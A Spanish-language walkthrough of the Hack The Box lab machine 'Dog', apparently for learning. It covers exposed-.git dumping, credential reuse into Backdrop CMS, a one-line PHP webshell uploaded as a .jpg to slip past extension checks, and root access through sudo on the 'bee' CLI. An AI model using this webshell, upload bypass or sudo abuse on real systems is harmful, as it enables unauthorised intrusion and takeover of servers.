# Hack The Box - Dog 🐾
**Plataforma:** Hack The Box  
**Categoría:** Linux  
**Dificultad:** Fácil - Media  
**Fecha de resolución:** Abril 2025  

---
![image](https://github.com/user-attachments/assets/a703ca41-2b63-414a-8c13-ee4c798b1068)

---
## Información de la máquina
- **IP:** `10.10.11.X`
- **Sistema Operativo:** Linux
- **Técnicas principales:** Git Enumeration, Webshell Upload, Privilege Escalation via Bee CLI

---

## Enumeración inicial

Realizamos un escaneo de puertos:
```bash
nmap -sV -sC -oA nmap/dog 10.10.X.X
```
Descubrimos:

* HTTP en el puerto 80
* Acceso a un repositorio Git (.git expuesto)

---
## User.txt 🐾
🔍 Enumeración Web - Tecnologías detectadas:
```bash
whatweb http://10.10.11.X
```
* Apache 2.4.41 (Ubuntu)
* Backdrop CMS

Fuzz de directorios:
```bash
dirsearch -u http://10.10.11.58
```
➡ Se descubre .git/ expuesto.

---
🛠️ Clonación de Git expuesto:
```bash
git-dumper http://10.10.11.X/.git/ ./dog_git_repo
```
Al analizar el repo descargado:
* Se encuentra el archivo `settings.php` con **credenciales de base de datos**:
```bash
root:BackDrop{J2....}
```
---
## Acceso Inicial

🛡️ Enumeración de usuarios en la página

- Correo encontrado en la web: `support@dog.htb`
- Grepeando dentro de la carpeta `dog_git_repo`, se descubre otro correo:
  * tiffany@dog.htb
  
🛠️ Intento de login al CMS:
![image](https://github.com/user-attachments/assets/e88fc6f7-736e-48f9-b7ff-6f3731940fcb)

Login con:
```bash
Usuario: tiffany@dog.htb
Password: root:BackDrop{J2....}
```
✅ Acceso exitoso al panel de administración.
![image](https://github.com/user-attachments/assets/3395d466-c9b1-413c-89ef-a801437e1936)
---
## 🧨 Explotación - RCE
1. Crear una webshell
Contenido de `shell.php`:
```bash
<?php system($_GET['cmd']); ?>
```
Se renombra como shell.jpg para saltar la restricción de extensiones.

2. Subir Shell
* Subida usando el editor de "Add Content" ➔ "Insert Image" ➔ Choose File ➔ `shell.jpg`
![image](https://github.com/user-attachments/assets/4d6ac3ae-be9c-45ed-94d4-31a204460ff0)
![image](https://github.com/user-attachments/assets/3b721978-ee17-4918-8fc3-5919be81b6b3)

* El archivo queda disponible en:
```bash
http://10.10.11.X/files/inline-images/shell.jpg
```
3. Verificación de ejecución de comandos
Probar comando:
```bash
http://10.10.11.X/files/inline-images/shell.jpg?cmd=id
```
✅ Se obtiene respuesta: shell activa (www-data).
---
## Captura de User.txt

Obtener acceso SSH:

- Enumerar `/etc/passwd` para ver usuarios válidos.
- Identificar usuario `johncusack`.

Reutilizar contraseña encontrada en `settings.php` o en el dump para SSH login:
```bash
ssh johncusack@10.10.11.X
```
Una vez conectado:
```bash
cat user.txt
```
![image](https://github.com/user-attachments/assets/9abe92de-da90-43a7-a587-eb6e032dcb4e)

✅ User Flag obtenida: 33c1{redacted}

---
## 👑 Root.txt
1. Enumeración de privilegios sudo:
```bash
sudo -l
```
Resultado:
```bash
(ALL : ALL) /usr/local/bin/bee
```

2. Análisis del binario `/usr/local/bin/bee`
- `bee` es un **wrapper PHP** para ejecutar comandos en Backdrop CMS.
- Permite ejecutar código PHP usando el parámetro `ev`.

3. Consideración Importante: **Ruta de ejecución**
Al intentar ejecutar `bee ev` desde `~` (home del usuario), ocurre este error:
```bash
The required bootstrap level for 'eval' is not ready.
```
Para evitar este error, es necesario ubicarse en el directorio correcto: /var/www/html/.
> Nota Técnica:
> 
> 
> El script `bee` requiere estar en el path del proyecto Backdrop para poder inicializar correctamente (`bootstrap`) y ejecutar comandos como `system()`.
>
---

4. Escalada a Root usando Bee
Primero nos ubicamos en el directorio correcto:
```bash
cd /var/www/html
```
Después ejecutamos:
```bash
sudo /usr/local/bin/bee ev "system('cat /root/root.txt')"
```
![image](https://github.com/user-attachments/assets/cd58b8e2-9c30-48c5-94c4-a9d16eb3431b)

✅ Root Flag obtenida: 6bfd{redacted}

---

#**Notas y Lecciones Aprendidas**

- Siempre revisar `.git/` expuesto: puede revelar secretos críticos.
- CMS inseguros (como Backdrop mal configurado) son vectores comunes de RCE.
- Inspeccionar binarios o scripts que puedes ejecutar como `sudo`.
- Evalúa cada permiso con calma: abuso de `sudo` suele ser clave para escalada.
